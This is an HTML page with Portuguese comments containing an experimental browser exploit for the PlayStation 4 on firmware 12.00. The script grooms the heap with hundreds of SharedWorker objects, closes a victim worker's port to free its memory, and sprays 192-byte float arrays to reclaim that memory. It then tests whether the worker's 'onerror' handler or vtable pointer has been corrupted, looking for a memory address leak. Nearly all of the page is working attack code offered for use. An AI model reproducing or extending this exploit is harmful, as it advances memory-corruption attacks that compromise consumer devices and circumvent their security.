<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 LEAK MASTER</title>
    
</head>
<body>
    <h1>LEAK MASTER (Internal Pointer)</h1>
    <h3>Alvo: Corromper ponteiro 'onerror' ou 'vtable'</h3>
    <button onclick="start_leak_hunt()">INICIAR CAÇADA</button>
    <div id="log"></div>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            var color = type === "leak" ? "#ff00ff" : "#0f0";
            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // Tamanho 0xC0 (192 bytes) - Que deu Panic no seu teste DoubleArray!
        // Vamos usar esse tamanho, pois sabemos que ele sobrescreve algo vital.
        var TARGET_SIZE = 0xC0; 

        function build_payload() {
            // Usamos Double Array porque ele acessa o Butterfly Heap (onde o Worker provavelmente está)
            var elementCount = TARGET_SIZE / 8;
            var arr = new Array(elementCount);
            
            // Valor Mágico: 1.1 (0x3FF199999999999A)
            // É um valor seguro que não causa crash imediato se lido como float,
            // mas se lido como ponteiro, aponta para Userland (0x3FF1...).
            for(var i=0; i<arr.length; i++) {
                arr[i] = 1.1; 
            }
            return arr;
        }

        var workers = [];

        async function start_leak_hunt() {
            var payload = build_payload();
            log(`Payload construído (0x${TARGET_SIZE.toString(16)}).`);

            // 1. Grooming (380)
            for(let i=0; i<380; i++) {
                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // 2. Trigger (403)
            var count = 0;
            var limit = 403 - 380;

            var it = setInterval(() => {
                if (count >= limit) {
                    clearInterval(it);
                    
                    // A VÍTIMA
                    var v = workers.pop();
                    
                    // Define um handler antes de liberar
                    // O ponteiro para essa função fica guardado dentro do objeto Worker
                    v.onerror = function() { console.log("Erro original"); };
                    
                    // Guarda referência para teste
                    var p = v.port; 
                    
                    // FREE
                    v.port.close();
                    
                    // SPRAY (Reclaim)
                    var spray = [];
                    for(let k=0; k<10000; k++) {
                        spray.push(payload.slice(0));
                    }

                    // TESTE DE LEAK
                    setTimeout(() => {
                        check_leak(v, p);
                    }, 500);
                    
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+count);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
                count++;
            }, 50);
        }

        function check_leak(victim, port) {
            log("Verificando corrupção...");

            // Teste 1: Ler propriedade 'onerror'
            // Se sobrescrevemos o objeto, o ponteiro para a função deve ter virado 0x3FF1...
            try {
                var handler = victim.onerror;
                log("Handler atual: " + handler);
                
                if (handler !== null && typeof handler !== 'function') {
                    log("!!! LEAK ENCONTRADO (Handler corrompido) !!!", "leak");
                    log("Valor lido: " + handler, "leak");
                    alert("Leak Confirmado! Verifique o Log.");
                }
            } catch(e) {
                log("Erro ao ler handler: " + e);
                // Se o erro contiver um endereço, é um leak!
                if (e.toString().match(/0x[0-9a-fA-F]+/)) {
                    log("!!! LEAK NO ERRO !!! " + e, "leak");
                    alert("Leak no Erro!");
                }
            }

            // Teste 2: Disparar erro
            // Se o ponteiro vtable foi corrompido, isso vai crashar ou comportar estranho
            try {
                victim.dispatchEvent(new Event('error'));
            } catch(e) {
                log("Erro no dispatch: " + e);
            }

            log("Teste finalizado. Se o console não desligou e nada apareceu, tente outro tamanho.");
        }
    </script>
</body>
</html>
